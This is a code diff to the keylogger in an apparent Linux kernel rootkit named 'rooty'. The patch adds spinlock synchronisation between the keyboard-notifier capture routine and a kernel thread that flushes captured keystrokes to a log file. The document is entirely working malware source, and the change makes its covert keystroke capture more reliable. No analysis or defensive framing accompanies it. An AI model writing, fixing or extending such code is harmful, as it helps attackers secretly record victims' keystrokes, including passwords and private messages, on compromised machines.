@@ -11,6 +11,7 @@ DECLARE_WAIT_QUEUE_HEAD(flush_event);
 
 struct task_struct *log_ts;
 struct file *logfile;
+static DEFINE_SPINLOCK(keylog_lock);
 volatile unsigned long to_flush = 0;
 unsigned long logidx = 0;
 char logbuf[LOGSIZE];
@@ -97,10 +98,14 @@ static void ksym_cap ( struct keyboard_notifier_param *param, char *buf )
 void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
 {
     unsigned char type = (param->value >> 8) & 0x0f;
+    unsigned long flags;
+
+    spin_lock_irqsave(&keylog_lock, flags);
 
     if ( logidx >= LOGSIZE )
     {
         printk("rooty: KEYLOGGER: Failed to log key, buffer is full\n");
+        spin_unlock_irqrestore(&keylog_lock, flags);
         return;
     }
 
@@ -142,8 +147,12 @@ void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
     if ( logidx >= FLUSHSIZE && to_flush == 0 )
     {
         to_flush = 1;
+        spin_unlock_irqrestore(&keylog_lock, flags);
         wake_up_interruptible(&flush_event);
+        return;
     }
+
+    spin_unlock_irqrestore(&keylog_lock, flags);
 }
 
 int flusher ( void *data )
@@ -154,18 +163,28 @@ int flusher ( void *data )
 
     while (1)
     {
+        unsigned long flags;
+        unsigned long flush_len;
+        char flush_buf[LOGSIZE];
+
         wait_event_interruptible(flush_event, (to_flush == 1) || kthread_should_stop());
         if(kthread_should_stop())
 			return 0;
-        if (logfile)
+
+        spin_lock_irqsave(&keylog_lock, flags);
+        flush_len = logidx;
+        memcpy(flush_buf, logbuf, flush_len);
+        to_flush = 0;
+        logidx = 0;
+        spin_unlock_irqrestore(&keylog_lock, flags);
+
+        if (logfile && flush_len > 0)
         {
             old_fs = get_fs();
             set_fs(get_ds());
-            ret = vfs_write(logfile, logbuf, logidx, &pos);
+            ret = vfs_write(logfile, flush_buf, flush_len, &pos);
             set_fs(old_fs);
         }
-        to_flush = 0;
-        logidx = 0;
     }
 
     return 0;
